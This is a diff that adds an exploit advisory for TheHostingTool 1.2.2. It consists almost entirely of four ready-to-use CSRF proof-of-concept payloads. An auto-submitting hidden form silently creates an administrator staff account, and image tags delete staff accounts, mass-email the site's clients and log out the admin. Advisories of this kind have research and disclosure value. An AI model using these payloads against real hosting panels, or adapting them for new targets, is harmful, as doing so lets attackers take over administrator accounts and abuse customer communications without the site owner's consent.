@@ -1,0 +1,44 @@
+<!---
+    Title: TheHostingTool 1.2.2 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Mon 12 Jul 2010 01:19:52 PM EEST
+    Vendor: http://thehostingtool.com/
+    Download: http://thehostingtool.googlecode.com/files/THT-v1.2.2.zip
+--->
+
+-=[ CSRF PoC 1 - Create Staff Account ]=-
+
+    <html>
+        <head>
+            <title>TheHostingTool 1.2.2 Multiple CSRF Vulnerabilities - Create Staff Account</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/?page=staff?=add" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="user" value="root" />
+                <input type="hidden" name="email" value="root@root.com" />
+                <input type="hidden" name="name" value="root" />
+                <input type="hidden" name="pass" value="rootroot" />
+                <input type="hidden" name="conpass" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="add" value="Add Staff Account" />
+            </form>
+        </body>
+    </html>
+ 
+-=[ CSRF PoC 2 - Delete Staff Account ]=-
+
+    <img src="http://[domain]/admin/?page=staff?=delete&do=root&confirm=1" alt="Do you see this?" />
+    
+-=[ CSRF PoC 3 - Mass Email The Clients ]=-
+
+    <img src="http://[domain]/includes/ajax.php?function=massemail&subject=owned&msg=pwn" alt="Do you see this?" />
+
+-=[ CSRF PoC 4 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/?page=logout" alt="Do you see this?" />
+ 
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
